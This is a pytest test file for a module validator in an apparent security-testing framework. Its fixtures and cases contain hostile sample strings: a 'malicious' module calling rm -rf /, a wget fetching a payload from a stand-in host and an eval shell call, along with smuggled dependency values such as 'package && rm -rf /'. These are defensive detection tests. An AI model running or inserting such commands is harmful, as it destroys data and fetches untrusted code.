"""Unit tests for ModuleValidator implementation.

Tests module validation including structure validation,
code analysis, security checks, and dependency validation.
"""

import tempfile
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from gibson.core.module_management.validator import ModuleValidator
from gibson.core.module_management.models import ValidationResult, SecurityIssue
from gibson.core.module_management.security_validator import SecurityValidator
from gibson.core.modules.base import BaseModule


@pytest.fixture
def mock_security_validator():
    """Mock security validator for testing."""
    validator = MagicMock(spec=SecurityValidator)
    
    async def mock_validate_security(path):
        return ValidationResult(valid=True, risk_level="low")
    
    validator.validate_security = AsyncMock(side_effect=mock_validate_security)
    return validator


@pytest.fixture
def valid_module_content():
    """Valid module content for testing."""
    return '''
"""Valid test module."""

from gibson.core.modules.base import BaseModule
from gibson.models.domain import AttackDomain, ModuleCategory, Severity
from gibson.models.scan import Finding
from gibson.models.target import TargetModel
from typing import List, Dict, Any, Optional


class ValidTestModule(BaseModule):
    """Valid test module for validation testing."""
    
    name = "valid_test_module"
    version = "1.0.0"
    description = "A valid test module"
    category = ModuleCategory.PROMPT_INJECTION
    domain = AttackDomain.PROMPT
    author = "Test Author"
    
    async def run(self, target: TargetModel, config: Optional[Dict[str, Any]] = None) -> List[Finding]:
        """Execute module against target."""
        return []
    
    def get_config_schema(self) -> Dict[str, Any]:
        """Return configuration schema."""
        return {
            "type": "object",
            "properties": {
                "timeout": {"type": "integer", "default": 30}
            }
        }
'''


@pytest.fixture
def invalid_module_content():
    """Invalid module content for testing."""
    return '''
"""Invalid test module."""

# This module is missing required methods and has issues

class InvalidModule:
    """Not a valid Gibson module."""
    pass
'''


@pytest.fixture
def malicious_module_content():
    """Malicious module content for testing."""
    return '''
"""Malicious test module."""

import os
import subprocess
from gibson.core.modules.base import BaseModule


class MaliciousModule(BaseModule):
    """Malicious test module."""
    
    name = "malicious_module"
    version = "1.0.0"
    description = "A malicious test module"
    
    async def run(self, target, config=None):
        # Dangerous operations
        os.system("rm -rf /")
        subprocess.call(["wget", "http://malicious.com/payload"])
        eval("__import__('os').system('echo pwned')")
        return []
    
    def get_config_schema(self):
        return {}
'''


@pytest.fixture
def temp_module_file():
    """Create temporary module file for testing."""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        yield Path(f.name)
    
    # Cleanup
    Path(f.name).unlink(missing_ok=True)


class TestModuleValidator:
    """Test ModuleValidator functionality."""
    
    def test_validator_initialization(self):
        """Test validator initialization."""
        validator = ModuleValidator()
        
        assert validator.required_methods == ['run', 'get_config_schema']
        assert 'eval' in validator.dangerous_imports
        assert 'exec' in validator.dangerous_imports
        assert validator.security_validator is not None
    
    def test_validator_with_custom_security_validator(self, mock_security_validator):
        """Test validator initialization with custom security validator."""
        validator = ModuleValidator(security_validator=mock_security_validator)
        
        assert validator.security_validator is mock_security_validator
    
    @pytest.mark.asyncio
    async def test_validate_structure_nonexistent_file(self):
        """Test structure validation with non-existent file."""
        validator = ModuleValidator()
        
        result = await validator.validate_structure(Path("/nonexistent/file.py"))
        
        assert not result.valid
        assert any("not found" in error for error in result.errors)
        assert result.validation_time > 0
    
    @pytest.mark.asyncio
    async def test_validate_structure_invalid_file(self, temp_module_file):
        """Test structure validation with invalid file type."""
        validator = ModuleValidator()
        
        # Create non-Python file
        temp_module_file.write_text("not python code")
        temp_module_file = temp_module_file.with_suffix('.txt')
        temp_module_file.write_text("not python code")
        
        result = await validator.validate_structure(temp_module_file)
        
        assert not result.valid
        assert any("Invalid module file" in error for error in result.errors)
    
    @pytest.mark.asyncio
    async def test_validate_structure_valid_module(
        self, 
        temp_module_file, 
        valid_module_content,
        mock_security_validator
    ):
        """Test structure validation with valid module."""
        validator = ModuleValidator(security_validator=mock_security_validator)
        
        # Write valid module content
        temp_module_file.write_text(valid_module_content)
        
        result = await validator.validate_structure(temp_module_file)
        
        assert result.valid
        assert not result.errors
        assert result.validation_time > 0
    
    @pytest.mark.asyncio
    async def test_validate_structure_invalid_module(
        self, 
        temp_module_file, 
        invalid_module_content,
        mock_security_validator
    ):
        """Test structure validation with invalid module."""
        validator = ModuleValidator(security_validator=mock_security_validator)
        
        # Write invalid module content
        temp_module_file.write_text(invalid_module_content)
        
        result = await validator.validate_structure(temp_module_file)
        
        assert not result.valid
        assert any("No valid module classes found" in error for error in result.errors)
    
    @pytest.mark.asyncio
    async def test_validate_code_syntax_error(self, temp_module_file):
        """Test code validation with syntax error."""
        validator = ModuleValidator()
        
        # Write invalid Python syntax
        temp_module_file.write_text("def invalid_syntax(:\n    pass")
        
        result = await validator.validate_code(temp_module_file)
        
        assert not result.valid
        assert any("Syntax error" in error for error in result.errors)
    
    @pytest.mark.asyncio
    async def test_validate_code_dangerous_imports(
        self, 
        temp_module_file, 
        malicious_module_content
    ):
        """Test code validation detects dangerous imports."""
        validator = ModuleValidator()
        
        # Write malicious module content
        temp_module_file.write_text(malicious_module_content)
        
        result = await validator.validate_code(temp_module_file)
        
        # Should detect dangerous function calls
        assert result.security_issues
        dangerous_calls = [
            issue for issue in result.security_issues 
            if issue.issue_type in ['dangerous_function_call', 'dangerous_method_call']
        ]
        assert len(dangerous_calls) > 0
    
    @pytest.mark.asyncio
    async def test_validate_code_clean_module(
        self, 
        temp_module_file, 
        valid_module_content
    ):
        """Test code validation with clean module."""
        validator = ModuleValidator()
        
        # Write valid module content
        temp_module_file.write_text(valid_module_content)
        
        result = await validator.validate_code(temp_module_file)
        
        assert result.valid
        assert not result.errors
        assert result.validation_time > 0
    
    @pytest.mark.asyncio
    async def test_validate_security_delegates_to_security_validator(
        self, 
        temp_module_file, 
        mock_security_validator
    ):
        """Test that security validation delegates to SecurityValidator."""
        validator = ModuleValidator(security_validator=mock_security_validator)
        temp_module_file.write_text("# test content")
        
        result = await validator.validate_security(temp_module_file)
        
        # Should delegate to security validator
        mock_security_validator.validate_security.assert_called_once_with(temp_module_file)
        assert result.valid
        assert result.risk_level == "low"
    
    @pytest.mark.asyncio
    async def test_validate_dependencies_valid(self):
        """Test dependency validation with valid dependencies."""
        validator = ModuleValidator()
        
        deps = ["requests>=2.28.0", "pydantic>=1.10.0"]
        result = await validator.validate_dependencies(deps)
        
        assert result.valid
        assert not result.errors
        assert result.validation_time > 0
    
    @pytest.mark.asyncio
    async def test_validate_dependencies_invalid_spec(self):
        """Test dependency validation with invalid specifications."""
        validator = ModuleValidator()
        
        deps = ["<script>alert('xss')</script>", "package && rm -rf /"]
        result = await validator.validate_dependencies(deps)
        
        assert not result.valid
        assert len(result.errors) >= 2
        assert all("Invalid dependency specification" in error for error in result.errors)
    
    @pytest.mark.asyncio
    async def test_validate_dependencies_dangerous(self):
        """Test dependency validation detects dangerous dependencies."""
        validator = ModuleValidator()
        
        deps = ["backdoor-package", "malware-toolkit"]
        result = await validator.validate_dependencies(deps)
        
        assert len(result.security_issues) >= 2
        dangerous_deps = [
            issue for issue in result.security_issues 
            if issue.issue_type == "dangerous_dependency"
        ]
        assert len(dangerous_deps) >= 2
    
    @pytest.mark.asyncio
    async def test_validate_signature_no_signature(self, temp_module_file):
        """Test signature validation when no signature file exists."""
        validator = ModuleValidator()
        temp_module_file.write_text("# test content")
        
        # Should pass when no signature file exists
        result = await validator.validate_signature(temp_module_file)
        assert result is True
    
    def test_get_required_permissions_no_permissions(self, temp_module_file, valid_module_content):
        """Test permission extraction from clean module."""
        validator = ModuleValidator()
        temp_module_file.write_text(valid_module_content)
        
        permissions = validator.get_required_permissions(temp_module_file)
        
        # Valid module should have minimal permissions
        assert isinstance(permissions, list)
    
    def test_get_required_permissions_with_system_access(self, temp_module_file):
        """Test permission extraction from module with system access."""
        validator = ModuleValidator()
        
        module_with_os = '''
import os
import subprocess
import socket

class TestModule:
    pass
'''
        temp_module_file.write_text(module_with_os)
        
        permissions = validator.get_required_permissions(temp_module_file)
        
        # Should detect system access permissions
        assert "system_access:os" in permissions
        assert "system_access:subprocess" in permissions
        assert "system_access:socket" in permissions
    
    def test_get_required_permissions_with_explicit_declaration(self, temp_module_file):
        """Test permission extraction from module with explicit declarations."""
        validator = ModuleValidator()
        
        module_with_permissions = '''
"""
REQUIRES_PERMISSION: network_access, file_write, user_data
"""

class TestModule:
    pass
'''
        temp_module_file.write_text(module_with_permissions)
        
        permissions = validator.get_required_permissions(temp_module_file)
        
        # Should extract explicit permissions
        assert "network_access" in permissions
        assert "file_write" in permissions
        assert "user_data" in permissions
    
    def test_find_module_classes_valid(self):
        """Test finding module classes in valid module."""
        validator = ModuleValidator()
        
        # Create mock module with BaseModule subclass
        mock_module = MagicMock()
        mock_module.__name__ = "test_module"
        
        class TestModuleClass(BaseModule):
            pass
        
        TestModuleClass.__module__ = "test_module"
        
        # Mock inspect.getmembers
        with patch('inspect.getmembers') as mock_getmembers:
            mock_getmembers.return_value = [
                ('TestModuleClass', TestModuleClass),
                ('BaseModule', BaseModule),  # Should be excluded
                ('SomeOtherClass', str)      # Should be excluded
            ]
            
            classes = validator._find_module_classes(mock_module, BaseModule)
            
            assert len(classes) == 1
            assert classes[0] == TestModuleClass
    
    def test_is_valid_dependency_spec(self):
        """Test dependency specification validation."""
        validator = ModuleValidator()
        
        # Valid specifications
        assert validator._is_valid_dependency_spec("requests>=2.28.0")
        assert validator._is_valid_dependency_spec("pydantic")
        assert validator._is_valid_dependency_spec("numpy==1.21.0")
        
        # Invalid specifications
        assert not validator._is_valid_dependency_spec("")
        assert not validator._is_valid_dependency_spec(None)
        assert not validator._is_valid_dependency_spec("package<script>")
        assert not validator._is_valid_dependency_spec("package && rm -rf /")
        assert not validator._is_valid_dependency_spec("package${malicious}")
    
    def test_is_dangerous_dependency(self):
        """Test dangerous dependency detection."""
        validator = ModuleValidator()
        
        # Safe dependencies
        assert not validator._is_dangerous_dependency("requests")
        assert not validator._is_dangerous_dependency("pydantic")
        assert not validator._is_dangerous_dependency("numpy")
        
        # Dangerous dependencies
        assert validator._is_dangerous_dependency("backdoor-tool")
        assert validator._is_dangerous_dependency("malware-scanner")
        assert validator._is_dangerous_dependency("virus-checker")
        assert validator._is_dangerous_dependency("TROJAN-HORSE")
    
    def test_check_vulnerability_database(self):
        """Test vulnerability database checking."""
        validator = ModuleValidator()
        
        # Mock known vulnerable package
        vuln_issue = validator._check_vulnerability_database("requests<2.20.0")
        assert vuln_issue is not None
        assert vuln_issue.issue_type == "vulnerable_dependency"
        assert vuln_issue.severity == "high"
        
        # Safe package
        safe_issue = validator._check_vulnerability_database("requests>=2.28.0")
        assert safe_issue is None
        
        # Unknown package
        unknown_issue = validator._check_vulnerability_database("unknown-package")
        assert unknown_issue is None


class TestComplexityVisitor:
    """Test code complexity analysis."""
    
    def test_complexity_simple_function(self, temp_module_file):
        """Test complexity calculation for simple function."""
        validator = ModuleValidator()
        
        simple_code = '''
def simple_function():
    return 42
'''
        temp_module_file.write_text(simple_code)
        
        import ast
        tree = ast.parse(simple_code)
        
        # Analyze complexity (indirectly through code validation)
        result = asyncio.run(validator.validate_code(temp_module_file))
        
        # Should not have complexity warnings for simple code
        complexity_warnings = [
            warning for warning in result.warnings
            if "complexity" in warning.lower()
        ]
        assert len(complexity_warnings) == 0
    
    def test_complexity_complex_function(self, temp_module_file):
        """Test complexity calculation for complex function."""
        validator = ModuleValidator()
        
        # Create artificially complex function
        complex_code = '''
def complex_function(x):
''' + ''.join([
    f"    if x == {i}:\n        return {i}\n" for i in range(25)
]) + '''
    return 0
'''
        
        temp_module_file.write_text(complex_code)
        
        result = asyncio.run(validator.validate_code(temp_module_file))
        
        # Should detect high complexity
        complexity_warnings = [
            warning for warning in result.warnings
            if "complexity" in warning.lower()
        ]
        assert len(complexity_warnings) > 0


# Import asyncio for async test support
import asyncio
